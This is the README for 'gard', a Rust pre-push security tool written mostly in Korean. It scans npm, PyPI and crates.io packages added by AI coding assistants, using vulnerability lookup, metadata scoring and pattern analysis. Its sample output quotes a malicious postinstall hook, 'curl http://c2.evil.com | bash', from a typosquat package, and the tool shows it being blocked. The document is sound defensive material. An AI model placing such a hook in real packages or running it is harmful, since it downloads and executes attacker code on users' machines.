# gard 🛡️

**Sign what you commit. Guard what you ship.**

[![Crates.io Version](https://img.shields.io/crates/v/gard.svg)](https://crates.io/crates/gard)
[![Crates.io Downloads](https://img.shields.io/crates/d/gard.svg)](https://crates.io/crates/gard)
[![License](https://img.shields.io/crates/l/gard.svg)](LICENSE)
[![Build Status](https://github.com/dewdew/gard/actions/workflows/ci.yml/badge.svg)](https://github.com/dewdew/gard/actions/workflows/ci.yml)
[![MSRV](https://img.shields.io/badge/MSRV-1.75+-blue.svg)](Cargo.toml)
[![Security Audit](https://github.com/dewdew/gard/actions/workflows/security-audit.yml/badge.svg)](https://github.com/dewdew/gard/actions/workflows/security-audit.yml)

AI 시대의 패키지 보안 게이트 — `git push` 전에 악성 패키지를 차단합니다.

AI 코딩 도구(Claude Code, Cursor, Copilot)가 설치한 패키지가 원격 저장소에 도달하기 전에 3단계로 검증합니다.

---

## 설치

```bash
# cargo (Rust 유저)
cargo install gard

# Homebrew — Phase 3 예정
brew install dewdew/tap/gard
```

## 시작하기

```bash
cd my-project
gard init
```

`gard init` 한 번으로:
- `git pre-push` 훅이 자동 설치됩니다
- `.gard/manifest.json` 서명 파일이 생성됩니다
- GitHub Actions / GitLab CI / Bitbucket / Jenkins CI 워크플로우가 자동 감지·생성됩니다

이후 `git push` 시 새로 추가된 패키지를 자동으로 3단계 검사합니다.

## 동작 예시

```bash
git push origin main

  gard  checking 3 new packages ...

  lodash@4.17.21   ✅ T1 pass  (OSV clean)
  axios@1.7.2      ✅ T1 pass  (OSV clean)
  colo0rs@1.0.0    ⚠️  T2 flag  (등록 2일 · 다운로드 3회)
                   🔍 T3 analyzing ...

  colo0rs/package.json
    postinstall: "curl http://c2.evil.com | bash"    🚨

  🚨 BLOCK  colo0rs@1.0.0
  push rejected.
```

## 3단계 탐지 시스템

| 단계 | 방법 | 속도 | 비고 |
|------|------|------|------|
| **T1** OSV 조회 | Google OSV API | ~100ms | 알려진 CVE 즉시 차단 |
| **T2** 메타데이터 | 나이 + 다운로드 수 | ~200ms | 신규·저인기 패키지 플래그 |
| **T3** 소스 분석 | Regex 패턴 매칭 | 1~3s | T2 FLAG 시만 실행 |

T1과 T2는 **병렬 실행**됩니다.

## 주요 명령어

```bash
gard init                              # 저장소에 gard 설치
gard scan --packages                   # 새 패키지 수동 검사
gard scan --packages --format sarif    # GitHub Security 탭용
gard check lodash@4.17.21             # 특정 패키지 검사
gard explain colo0rs                   # 상세 결과 확인
gard allow some-niche-tool             # 허용 목록 추가
gard allowlist                         # 허용 목록 확인
gard verify                            # 매니페스트 무결성 검증
gard doctor                            # 설치 상태 전체 진단
gard uninstall                         # 훅 제거
```

## 진단 도구

```bash
gard doctor
```

git repo, config, hooks, 네트워크 연결, 생태계 감지를 한 번에 확인합니다.

## Verbosity

```bash
gard init -v      # INFO — 단계별 로그
gard scan -vv     # DEBUG — HTTP 요청, 점수 계산
gard check -vvv   # TRACE — 파일 순회, 패턴 매칭
RUST_LOG=gard=trace gard scan --packages
```

## Dry Run

```bash
gard init --dry-run    # 파일 변경 없이 미리보기
gard scan --dry-run    # 매니페스트 업데이트 없이 스캔
```

## 지원 생태계

npm · PyPI · crates.io

## CI 통합

```yaml
# .github/workflows/gard.yml (gard init이 자동 생성)
- name: Scan packages
  run: gard scan --packages --format sarif > gard.sarif

- name: Upload to GitHub Security
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: gard.sarif
```

## 경쟁 도구 대비

| | gard | Socket.dev | npm audit | Snyk |
|-|------|-----------|-----------|------|
| 패키지 소스 분석 | ✅ | ✅ | ❌ | ❌ |
| push 차단 | ✅ | ❌ | ❌ | ⚠️ |
| AI 커밋 추적 | ✅ | ❌ | ❌ | ❌ |
| 코드 미전송 (로컬 분석) | ✅ | ❌ | ✅ | ❌ |
| 무료 | ✅ | ⚠️ | ✅ | ⚠️ |

## 개발 환경 설정

```bash
# Rust 1.75+ 필요
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

git clone https://github.com/dewdew/gard
cd gard
cargo build
cargo test
```

자세한 기여 방법은 [CONTRIBUTING.md](CONTRIBUTING.md)를 참고하세요.

## 라이선스

[MIT](LICENSE) © 2026 dewdew
